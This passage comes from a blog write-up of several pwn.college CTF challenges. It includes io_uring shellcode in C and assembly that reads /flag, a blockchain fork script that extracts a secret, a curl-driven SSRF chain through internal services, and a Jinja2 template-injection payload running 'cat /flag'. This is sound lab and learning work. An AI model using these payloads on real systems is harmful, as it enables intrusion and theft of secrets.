printf("offsetof(struct io_uring_sqe, len): %d\n", offsetof(struct io_uring_sqe, len));
```

The result is this short snippet:
```c
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>
#include <linux/io_uring.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stddef.h>

int main() {
    int ring_fd;
    struct io_uring_sqe *sqes;
    struct io_uring_cqe *cqes;

    uint32_t *sq_tail;
    uint32_t *cq_head;

    uint8_t rings_stack[4096] __attribute__((aligned(4096)));
    uint8_t sqes_stack[4096] __attribute__((aligned(4096)));

    memset(rings_stack, 0, 4096);
    memset(sqes_stack, 0, 4096);

    struct io_uring_params p = {0};
    char *p_ptr = (char *)&p;

    *((uint32_t*)(p_ptr + 0x0)) = 8;
    *((uint32_t*)(p_ptr + 0x4)) = 8;
    *((uint32_t*)(p_ptr + 0x8)) = 0x14000;
    *((uint64_t*)(p_ptr + 0x70)) = (uint64_t)rings_stack;
    *((uint64_t*)(p_ptr + 0x48)) = (uint64_t)sqes_stack;

    ring_fd = syscall(__NR_io_uring_setup, 8, &p);

    sqes = (struct io_uring_sqe *)sqes_stack;
    sq_tail = (uint32_t *)((char *)rings_stack + 4);            // p.sq_off.tail
    cqes = (struct io_uring_cqe *)((char *)rings_stack + 64);   // p.cq_off.cqes
    cq_head = (uint32_t *)((char *)rings_stack + 8);            // p.cq_off.head

    char path[] = "/flag";
    char buf[4096];

    struct io_uring_sqe sqe;
    memset(&sqe, 0, sizeof(sqe));
    char *sqe_ptr = (char *)&sqe;

    *((__u8 *)(sqe_ptr + 0)) = 18;                              // IORING_OP_OPENAT
    *((__s32 *)(sqe_ptr + 4)) = -100;                           // AT_FDCWD
    *((unsigned long *)(sqe_ptr + 16)) = (unsigned long)path;
    *((__u32 *)(sqe_ptr + 28)) = 0;                             // O_RDONLY;

    memcpy(&sqes[0], &sqe, sizeof(sqe));
    (*sq_tail)++;
    syscall(__NR_io_uring_enter, ring_fd, 1, 1, 1, NULL, 0);
    (*cq_head)++;

    int fd = cqes[0].res;
    printf("fd: %d\n", fd);

    memset(&sqe, 0, sizeof(sqe));
    *((__u8 *)(sqe_ptr + 0)) = 22;                              //IORING_OP_READ;
    *((__s32 *)(sqe_ptr + 4)) = fd;
    *((unsigned long *)(sqe_ptr + 16)) = (unsigned long)buf;
    *((unsigned long *)(sqe_ptr + 24)) = sizeof(buf);

    memcpy(&sqes[1], &sqe, sizeof(sqe));
    (*sq_tail)++;
    syscall(__NR_io_uring_enter, ring_fd, 1, 1, 1, NULL, 0);
    (*cq_head)++;

    int r = cqes[1].res;
    printf("read: %d\n", r);

    memset(&sqe, 0, sizeof(sqe));
    *((__u8 *)(sqe_ptr + 0)) = 23;                              // IORING_OP_WRITE;
    *((__s32 *)(sqe_ptr + 4)) = 1;
    *((unsigned long *)(sqe_ptr + 16)) = (unsigned long)buf;
    *((unsigned long *)(sqe_ptr + 24)) = r;

    memcpy(&sqes[2], &sqe, sizeof(sqe));
    (*sq_tail)++;
    syscall(__NR_io_uring_enter, ring_fd, 1, 1, 1, NULL, 0);
    (*cq_head)++;

    return 0;
}
```

Which, although maybe not production-grade, it gets the flag:
```bash
ubuntu@practice~2025~day-05:~$ gcc io_uring_min.c -o io_uring
ubuntu@practice~2025~day-05:~$ sudo ./io_uring
fd: 4
read: 22
pwn.college{practice}
```

From this point onward it was straight-forward. I fed this to a couple of LLMs and quickly got a working shellcode, with comments for easier torubleshooting:

```nasm
call get_pc                 /* Get PC for PIC base */
get_pc:
pop rbp                     /* rbp holds the base address */

sub rsp, 0x2000             /* Allocate and ALIGN RSP to a 4096-byte (0x1000) boundary */
mov r13, rsp
mov r12, 0xfffffffffffff000 /* 4096-byte alignment mask */
and r13, r12                /* r13 is now aligned RSP address (rings_stack) */
mov rsp, r13                /* Set aligned address as the new RSP */

mov r12, rsp                /* r12 = rings_stack (CQ ring & internal data base) */
mov r13, rsp                /* r13 = sqes_stack (SQE array base) */
add r13, 0x1000    

mov r15, r13                /* r15 = address of buf (r13 + 0x100, scratch space) */
add r15, 0x100              /* Go past sqes[0..3] */

mov rdi, r12                /* Start at rings_stack (r12) */
mov rcx, 0x2000             /* Length = 8192 bytes */
xor rax, rax
rep stosb                   /* Clear rings_stack and sqes_stack */

mov r15, r13
add r15, 0x100              /* Point r15 to the scratch buffer */

mov rax, 0x00550067616c662f /* Setup path "/flag" */
mov qword ptr [r15], rax
mov r14, r15                /* r14 = address of "/flag" for OPENAT */

mov rdi, r12                /* Setup io_uring_params p on the stack */
sub rdi, 0x100              /* rdi = address of p */
mov rcx, 0x80
xor rax, rax
rep stosb                   /* memset(p, 0, 128) */
mov rsi, rdi                /* rsi = &p */

mov dword ptr [rsi], 0x8        /* Set p.sq_entries = 8 (offset 0x0)  */
mov dword ptr [rsi+4], 0x8      /* Set p.cq_entries = 8 (offset 0x4)  */
mov dword ptr [rsi+8], 0x14000  /* Set p.flags = 0x14000 (offset 0x8) */                      

mov qword ptr [rsi+0x48], r13   /* Set p.sq_off.user_addr = sqes_stack (r13) (OFFSET: 0x48)  */
mov qword ptr [rsi+0x70], r12   /* Set p.cq_off.user_addr = rings_stack (r12) (OFFSET: 0x70) */

mov rax, 425                /* __NR_io_uring_setup  */
mov rdi, 8                  /* sq_entries           */
syscall                     /* rsi = &p             */
mov ebx, eax                /* ebx = ring_fd        */

mov rcx, r13                /* rcx = sqes (sqes_stack) */
mov rdi, rcx                /* rdi = address of sqes[0] */

mov byte ptr [rdi], 18              /* sqe.opcode = 18 */
mov dword ptr [rdi+4], 0xffffff9c   /* sqe.fd = -100 */
mov qword ptr [rdi+0x10], r14       /* sqe.addr = r14 */
mov dword ptr [rdi+0x1c], 0         /* open_flags (O_RDONLY = 0) at offset 0x1c (28) */

mov r8, r12                 /* r8 = rings_stack (Mapped Ring Base) */
add r8, 0x4                 /* sq_off.tail offset (4) */
inc dword ptr [r8]          /* Update sq_tail */

mov rax, 426                /* __NR_io_uring_enter */
mov rdi, rbx                /* ring_fd */
mov rsi, 1
mov rdx, 1
mov r10, 1
mov r8, 0 
mov r9, 0 
syscall                         /* io_uring_enter(ring_fd, 1, 1, 1, NULL, 0) - Submit OPENAT */

mov rdx, r12                    /* Get fd from cqe[0].res */
add rdx, 0x40                   /* rdx = CQE array base */
mov esi, dword ptr [rdx + 0x8]  /* esi = fd = cqe[0].res (offset 0x8) */

mov r8, r12                     /* Update cq_head after OPENAT retrieval */
add r8, 0x8
inc dword ptr [r8]

mov rdi, r13                    /* READ - Prepare sqe 1 */
add rdi, 0x40                   /* rdi = address of sqes[1] */

mov byte ptr [rdi], 22          /* sqe.opcode = 22 (IORING_OP_READ) */
mov dword ptr [rdi+4], esi      /* sqe.fd = esi (opened file descriptor) */
mov qword ptr [rdi+0x10], r15   /* sqe.addr = r15 (buf address) */
mov qword ptr [rdi+0x18], 100   /* sqe.len = 100 */


mov r8, r12                     /* Update sq_tail for the second submission */
add r8, 0x4
inc dword ptr [r8]

mov rax, 426
mov rdi, rbx
mov rsi, 1
mov rdx, 1
mov r10, 1
mov r8, 0
mov r9, 0
syscall                         /* io_uring_enter(ring_fd, 1, 1, 1, NULL, 0) - Submit READ */

mov r8, r12                     /* Get bytes read (r) from cqe[1].res */
add r8, 0x40                    /* r8 = CQE array base */
add r8, 0x10                    /* r8 points to start of cqe[1] */
mov r10d, dword ptr [r8 + 0x8]  /* r10d = bytes read (cqes[1].res) */

mov r9, r12                     /* Update cq_head after successful retrieval */
add r9, 0x8                     /* r9 = cq_head address */
inc dword ptr [r9]

mov rdi, r13                    /* WRITE - Prepare sqe 2 */
add rdi, 0x80                   /* rdi = address of sqes[2] */

mov byte ptr [rdi], 23          /* sqe.opcode = 23 (IORING_OP_WRITE) */
mov dword ptr [rdi+4], 1        /* sqe.fd = 1 (stdout) */
mov qword ptr [rdi+0x10], r15   /* sqe.addr = r15 (buf address) */
mov dword ptr [rdi+0x18], r10d  /* sqe.len = r10d (bytes read) */

mov r8, r12                     /* Update sq_tail for the third submission */
add r8, 0x4
inc dword ptr [r8]

mov rax, 426
mov rdi, rbx
mov rsi, 1
mov rdx, 1
mov r10, 1
mov r8, 0
mov r9, 0
syscall                         /* io_uring_enter(ring_fd, 1, 1, 1, NULL, 0) - Submit WRITE */

mov r9, r12                     /* Final cq_head update for WRITE result */
add r9, 0x8
inc dword ptr [r9]

xor edi, edi
mov rax, 60
syscall                         /* Exit cleanly */
```

I used a wrapper Python script to feed the shellcode to a pipe, to debug the challenge easier in GDB. Whew! Let's get the flag:
```bash
$ /challenge/sleigh < ~/my_fifo_stdin
🛷 Loading cargo: please stow your sled at the front.
📜 Checking Santa's naughty list... twice!
pwn.college{practice}

$ python sleigh.py
Press ENTER to send shellcode payload to fifo...
```

## Day 6 - Custom blockchain

This challenge has multiple files and a lot more code. There area children, elves, the North Pole (or _Poole_) and of course Santa. Not being very familiar with blockchains, I used an LLM to do a first pass through the entire code and get an overview about what's happening. In retrospective, this was both good and bad. Good because I got a solution almost immediately, which solved about 85% of the puzzle, and bad because to solve the other 15% LLMs were going in circles, and I still had to go back and understand the logic well and figure out how to get the flag. Regardless, this is a very interesting challenge.

### High-level architecture 

There are four actors:

🎄 North Poole (`north_poole.py`) - A minimal blockchain node
* Maintains blocks, tx pool, balances
* Uses PoW (difficulty = 16 → 4 hex zeros)
* Tracks a “nice list” balance
* Longest-chain wins (highest index)
* No signatures on blocks (!)

🎅 Santa (`santa.py`)
* Scans the blockchain
* Looks for confirmed letters
* Only gifts children who are nice
* Responds with normal gifts, secret characters or the flag

🧝 Elves (`elf.py`)
* Honest miners
* Randomly add a child to the nice list
* Avoid adding the same child repeatedly
* Mine continuously

👶 Children (`children.py`)
* Children are children 😇
* Randomly send signed “Dear Santa” letters
* Ask for toys
* Their letters go into the `tx` pool

### Blockchain rules

**Proof-of-Work**: A block is valid if
```python
sha256(block_json).startswith("0000")
```

**Longest chain wins**: The best chain is the block with the highest index
```python
def get_best_chain_block():
    best_hash = None
    best_index = -1
    for blk_hash, blk in BLOCKS.items():
        if blk["index"] > best_index:
            best_index = blk["index"]
            best_hash = blk_hash
    return best_hash
```


**Balance system**: Everyone starts with balance 1 and each block may include a nice field
```python
"nice": "<child_name>"
```
Which increases the person's balance
```python
balances[nice_person] += 1
```
Santa gives gifts only to nice children
```python
balances[child] > 0
```

Anyone can mine a block and set nice = ANYONE. There is no signature, no authority check. The only limits are:
* max 10 times per identity per chain
* nice person cannot appear as `tx.src` in that same block

### Santa's confirmation logic

Santa only trusts letters in blocks that are:
```python
chain[:-REQUIRED_CONFIRMATION_DEPTH]
```
Where `REQUIRED_CONFIRMATION_DEPTH = 5`. So:
* Letters must be 6 blocks deep
* Recent blocks are ignored
* This mimics Bitcoin-style confirmations

### The secret and flag
At startup the pool script initialises a secret gift:
```python
SECRET_GIFT = os.urandom(16).hex()  # 32 hex chars
```
If a letter contains `secret index #N` Santa replies with `SECRET_GIFT[N]`. So we can exfiltrate the secret one character at a time. If a letter contains the entire secret string previously exfiltrated, Santa provides the flag:
```python
if SECRET_GIFT in letter["letter"]:
    gift_value = FLAG_GIFT
```

### Plan

Inflate the nice balance to maximum (1 + 10) by mining 10 blocks and setting `hacker` as nice:
```python
for _ in range(10):
  mine_block(nice_person="hacker")
```

<div class="box-note">
I realised that inflating the balance is not actually needed, it's just something the an LLM thought it makes sense, which it does somewhat, but is not necessary at all.
</div>

All the levels were very educative! Huge thanks to the authors.

Before moving on to the next step, remember a clean head before Santa gifts the secrets. It will be useful later:
```python
clean_head = get_head()["hash"]
clean_index = get_head()["block"]["index"]
```

Request the 32 secret characters
```python
for i in range(32):
  n = send_letter(
    f"Dear Santa,\n\nFor christmas this year I would like secret index #{i}"
  )
  nonce_map[n] = i
```

Confirm the letters by mining 6 additional blocks, so letters will be >=6 blocks deep and Santa will trust them
```python
for _ in range(6):
  mine_block()
  time.sleep(1)
```

Collect the 32 characters of the secret by scanning the `txpool` and mapping the gifts to the nonce of the requests:
```python
recovered = ["?"] * 32
got = 0

while got < 32:
  txs = requests.get(f"{NORTH_POOLE}/txpool").json().get("txs", [])
  
  cur = get_head()["hash"]
  for _ in range(8):
    blk = get_block(cur)
    txs.extend(blk["txs"])
    cur = blk["prev_hash"]
  
  for tx in txs:
    if tx.get("type") == "gift" and tx.get("dst") == MY_NAME:
      req = tx["nonce"].replace("-gift", "")
      if req in nonce_map:
        idx = nonce_map[req]
        if recovered[idx] == "?":
          recovered[idx] = tx["gift"]
          got += 1
          print(
            f"\rProgress: {''.join(recovered)} ({got}/32)",
            end=""
          )
  time.sleep(2)
```

Fork the chain from the clean head saved before Santa gifted the secret characters, and continue to mine until the fork becomes the best chain. This is easy because the elves have a random delay after mining each block:
```python
time.sleep(random.randint(10, 120))
```
A re-org will happen and the nice balance is kept. Without the fork the balance would have been negative (1 + 10 - 32 = -21) and we would be stuck.

Ask for the flag:
```bash
$ python solver.py

--- ⛏️ STEP 1: Mine nice balance buffer ---
[+] Mined block 4 | TXs=2 | Nice=hacker
[+] Mined block 5 | TXs=0 | Nice=hacker
[+] Mined block 6 | TXs=0 | Nice=hacker
[+] Mined block 7 | TXs=0 | Nice=hacker
[+] Mined block 8 | TXs=0 | Nice=hacker
[+] Mined block 9 | TXs=0 | Nice=hacker
[+] Mined block 10 | TXs=0 | Nice=hacker
[+] Mined block 11 | TXs=0 | Nice=hacker
[+] Mined block 12 | TXs=0 | Nice=hacker
[+] Mined block 13 | TXs=2 | Nice=hacker

--- 📧 STEP 2: Request 32 secret characters ---

--- ⛏️ STEP 3: Confirm letters ---
[+] Mined block 14 | TXs=33 | Nice=None
[+] Mined block 15 | TXs=1 | Nice=None
[+] Mined block 16 | TXs=0 | Nice=None
[+] Mined block 17 | TXs=0 | Nice=None
[+] Mined block 18 | TXs=0 | Nice=None
[+] Mined block 19 | TXs=0 | Nice=None

--- 🎁 STEP 4: Collect secrets ---
Progress: 34448de412c2c60bd2afb4a8c113c24c (32/32)
[+] Secret recovered: 34448de412c2c60bd2afb4a8c113c24c

--- 🌲 STEP 5: Mine fork until it becomes best ---
[+] Mined block 14 | TXs=0 | Nice=None
[i] Fork index=14, Head index=19
[+] Mined block 15 | TXs=0 | Nice=None
[i] Fork index=15, Head index=19
[+] Mined block 16 | TXs=0 | Nice=None
[i] Fork index=16, Head index=19
[+] Mined block 17 | TXs=0 | Nice=None
[i] Fork index=17, Head index=19
[+] Mined block 18 | TXs=0 | Nice=None
[i] Fork index=18, Head index=19
[+] Mined block 19 | TXs=0 | Nice=None
[i] Fork index=19, Head index=19
[+] Mined block 20 | TXs=0 | Nice=None
[i] Fork index=20, Head index=20
[✓] Fork is now the active best chain
[nice] after fork balances: {'alder': 2, 'ash': 1, 'aspen': 1, 'birch': 1, 'cedar': 2, 'cypress': 1, 'elm': 1, 'hacker': 10, 'hazel': 1, 'holly': 1, 'juniper': 1, 'laurel': 1, 'maple': 1, 'pine': 1, 'rowan': 1, 'santa': 2, 'spruce': 1, 'willow': 0}
[nice] after fork hacker balance: 10

--- 🎅 STEP 6: Request FLAG ---

--- 🎁 STEP 7: Waiting for FLAG gift ---
🏁 FLAG: 3
.....
🏁 FLAG: pwn.college{ohENUI7kBHILv-h1IFOZfDPnPzp.QX0ETOxIDLzQDMyQzW}
```

## Day 7 - SSRFs chain

This challenge is a set of vulnerable web apps, interestingly nested like a Matryoshka doll. 

### {The Turkey 🦃}

**_A welcoming outer roast_**

A vulnerable Flask app running as root that accepts a `hacker_image` URL:
```html
<form action="/check" method="POST">
  <label for="hacker_name">Hacker Name:</label>
  <input type="text" id="hacker_name" name="hacker_name" required>
  
  <label for="hacker_image">Hacker Image URL (optional):</label>
  <input type="text" id="hacker_image" name="hacker_image" placeholder="https://example.com/image.jpg">
  
  <input type="submit" value="Check Naughty List">
</form>
```
And has a route `/check` which makes an outbound HTTP request using the `requests.get()` function:
```python
@app.route('/check', methods=['POST'])
def check():
  hacker_name = request.form.get('hacker_name', '')
  hacker_image_url = request.form.get('hacker_image', '')
```

The outer layer also deobfuscates and executes the next layer:
```python
if PAYLOAD:
  decoded = base64.b64decode(PAYLOAD)
  reversed_bytes = decoded[::-1]
  unpacked = bytes(b ^ 0x42 for b in reversed_bytes)
  subprocess.run(unpacked.decode(), shell=True)
```

### {The Duck 🦆}

**_A warm, well-seasoned middle stuffing_**

The Duck is a bash script which first sets up a network namespace to act as a middleware, with IP addresses and `iptables` rules:
```bash
ip netns add middleware
ip link add veth-host type veth peer name veth-middleware
ip link set veth-middleware netns middleware
ip addr add 72.79.72.1/24 dev veth-host
ip link set veth-host up

ip netns exec middleware ip addr add 72.79.72.79/24 dev veth-middleware
ip netns exec middleware ip link set veth-middleware up
ip netns exec middleware ip route add default via 72.79.72.1
ip netns exec middleware ip link set lo up

iptables -A OUTPUT -o veth-host -m owner --uid-owner root -j ACCEPT
iptables -A OUTPUT -o veth-host -j REJECT
```

The script then sets up a Node.js middleware service running at 72.79.72.79:80, with its own SSRF vulnerability via the `/fetch` endpoint. This service acts as our internal pivot point into the Chicken.
```js
const server = http.createServer(async (req, res) => {
     const parsedUrl = url.parse(req.url, true);

     if (parsedUrl.pathname === '/') {
          res.writeHead(200, { 'Content-Type': 'text/html' });
          res.end('<h1>Welcome to the middleware service. We fetch things!</h1>');
     } else if (parsedUrl.pathname === '/fetch') {
          const targetUrl = parsedUrl.query.url;

          if (!targetUrl) {
               res.writeHead(400, { 'Content-Type': 'text/html' });
               res.end('<h1>Missing url parameter</h1>');
               return;
          }

          try {
               const response = await fetch(targetUrl);
               const content = await response.text();
               res.writeHead(200, { 'Content-Type': 'text/plain' });
               res.end(content);
          } catch (error) {
               res.writeHead(500, { 'Content-Type': 'text/html' });
               res.end(\`<h1>Error fetching URL: \${error.message}</h1>\`);
          }
     } else {
          res.writeHead(404, { 'Content-Type': 'text/html' });
          res.end('<h1>Not Found</h1>');
     }
});
```
The middleware is executed in the previously created network namespace by piping this whole JavaScript code to `cobol`, which is in fact Node.js:

```bash
$ /usr/bin/cobol
Welcome to Node.js v20.19.6.
Type ".help" for more information.
```

The Duck also decodes and executes another payload:
```js
const payload = 'a3IicG...';

if (payload) {
     const decoded = Buffer.from(payload, 'base64');
     const unpacked = Buffer.from(decoded.map(byte => (byte - 2 + 256) % 256));
     execSync(unpacked.toString(), { stdio: 'inherit' });
}
```
The inner layer is easy to uncover with a few lines of Python:
```python
import base64

payload = 'a3IicGd...'
decoded = base64.b64decode(payload)

output = "".join(["%c" % ((byte - 2 + 256) % 256) for byte in decoded])
print(output)
```

### {The Chicked 🐔}

**_A a rich, indulgent core that ties the whole dish together_**

A simple Sinatra Ruby web app masquerading as PHP:
```ruby
require 'sinatra'

set :environment, :production
set :bind, '88.77.65.83'
set :port, 80

get '/' do
  \"<h1>Go away, you'll never find the flag</h1>\"
end

get '/flag' do
  if params['xmas'] == 'hohoho-i-want-the-flag'
    File.read('/flag')
  else
    \"<h1>that's not correct</h1>\"
  end
end
```
The backend is executed in its own backend network namespace by piping the Ruby code to _PHP_:
```bash
echo "..." | ip netns exec backend /usr/bin/php - &
```

Which is in fact:
```bash
$ /usr/bin/php  -v
ruby 3.2.3 (2024-01-18 revision 52bb2ac0a6) [x86_64-linux-gnu]
```

Tying everything together, this is the SSRF chain:
* Browser → Flask App (Running as aoot on the host)
* Flask App → Node.js Middleware (72.79.72.79/fetch)
* Node.js Middleware → Sinatra Flag Service (88.77.65.83/flag)

```bash
$ curl -X POST "http://10.32.165.59/check" \
  -d "hacker_name=SSRF-Exploit" \
  -d "hacker_image=http://72.79.72.79/fetch?url=http://88.77.65.83/flag?xmas=hohoho-i-want-the-flag"

    <!DOCTYPE html>
    <html>
    <head>
        <title>Naughty List Result</title>
        <style>
            body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; }
            h1 { color: #c41e3a; }
            .result { margin-top: 30px; padding: 20px; border: 2px solid #c41e3a; border-radius: 5px; }
            .naughty { background-color: #ffebee; }
            .nice { background-color: #e8f5e9; }
            img { max-width: 100%; margin-top: 20px; border: 1px solid #ccc; }
            a { display: inline-block; margin-top: 20px; color: #c41e3a; }
        </style>
    </head>
    <body>
        <h1>Naughty List Result</h1>
        <div class="result nice">
            <h2>SSRF-Exploit</h2>
            <p><strong>Status:</strong> NICE 😁</p>
            <img src="data:image/png;base64,cHduLmNvbGxlZ2V7WTJDM1NzOV9qZlpGUnVRX2F6V21kOHNDalMyLlFYMUVUT3hJREx6UURNeVF6V30K" alt="Hacker Image">
        </div>
        <a href="/">🔙 Back to form</a>
    </body>
    </html>

$ ecHduLmNvbGxlZ2V7WTJDM1NzOV9qZlpGUnVRX2F6V21kOHNDalMyLlFYMUVUT3hJREx6UURNeVF6V30K | base64 -d
pwn.college{Y2C3Ss9_jfZFRuQ_azWmd8sCjS2.QX1ETOxIDLzQDMyQzW}
```

## Day 8 - Jinja2 template

There are multiple pieces in this challenge and probably multiple solutions as well. Once we understand all the operations in Santa's workshop, it's not difficult to find a solution. At a high level:
* We can create toys based on 3 Jinja2 templates (`/create`), which are actually C programs
* Compiled them (`/assemble/<toy_id>`) via `gcc -x c -O2 -pipe ..`
* And play with them (`/play<toy_id>`)

Templates are similar, but the one I exploited is the Teddy Bear:
```c
$ cat /challenge/templates/teddy.c.j2
/* Teddy Bear */
#include <stdio.h>
#include <string.h>

int main(void) {
    char note[80];

    setbuf(stdout, NULL);
    puts("soft hug!");

    printf("teddy keeps this secret: %s\n", "{{ secret }}");
    printf("share a feeling (%s):\n", "{{ feeling }}");

    if (!fgets(note, sizeof(note), stdin)) return 0;

    size_t len = strlen(note);
    if (len > 0 && note[len - 1] == '\n') note[len - 1] = 0;

    printf("teddy repeats back: %s\n", note);
    printf("letters counted: %zu\n", strlen(note));
    return 0;
}
```

When we create toys, we get the `toy_id`, useful later:
```bash
$ curl -s -X POST -H "Content-Type: application/json" -d '{"template":"teddy.c.j2"}' http://127.0.0.1/create
{"toy_id":"e27d0ccb7a29fdac"}
```

For thinkering there are two options, we can either replace parts of the template or render it. Both operations are juicy! My approach was to insert a flag-leaking Python payload in one of the payloads, render it (making sure the result C code remains valid) the massemble and execute.

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read().strip()}}
```

**Step 1 - Create a toy**

```bash
$ curl -s -X POST -H "Content-Type: application/json" -d '{"template":"teddy.c.j2"}' http://127.0.0.1/create

{"toy_id":"fe371ffc9ce21bd9"}
```

**Step 2 - Insert the payload**

The trickiest part here was to work around the multiple levels of quoted strings inside quoted strings inside quoted strings. But with some experimentation, here's the working payload:

```bash
$ curl -X POST -H "Content-Type: application/json" -d "{\"op\":\"replace\",\"index\":192,\"length\":1000,\"content\":\"request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read().strip()}}\\\");}\"}" http://127.0.0.1/tinker/fe371ffc9ce21bd9

{"status":"tinkered"}
```

<div class="box-note">
The payload cuts the rest of the C code after successfuly closing the functions, to avoid any syntax errors.
</div>

**Step 3 - Render the payload**

When we render the payload we don't need anything in the context, so w can just use a dummy variable:
```bash
$ curl -s -X POST -H "Content-Type: application/json" -d '{ "op": "render", "context": { "bubu": "dummy" } }' http://127.0.0.1/tinker/fe371ffc9ce21bd9

{"status":"tinkered"}
```

In practice mode, at this stage we can verify the template has been rendered as expected:
```bash
$ sudo cat /run/workshop/tinkering/0841ce1d1a8a65f9142138a1b7e2be07682ac46c5d7bb876e258c5b2b3a2d352
/* Teddy Bear */
#include <stdio.h>
#include <string.h>

int main(void) {
    char note[80];

    setbuf(stdout, NULL);
    puts("soft hug!");

    printf("teddy keeps this secret: %s\n", "pwn.college{practice}");}
```

**Step 4 - Assemble the toy**

```bash
$ curl -s -X POST -H "Content-Type: application/json" http://127.0.0.1/assemble/fe371ffc9ce21bd9

{"status":"assembled"}
```

**Step 5 - Play!**

Play with the toy, which runs the compiled binary, which includes the flag rendered in the previous step:

```bash
$ curl -s -X POST -H "Content-Type: application/json" -d '{"stdin":"hello"}' http://127.0.0.1/play/fe371ffc9ce21bd9

{"returncode":0,"stderr":"","stdout":"soft hug!\nteddy keeps this secret: pwn.college{practice}\n"}
```
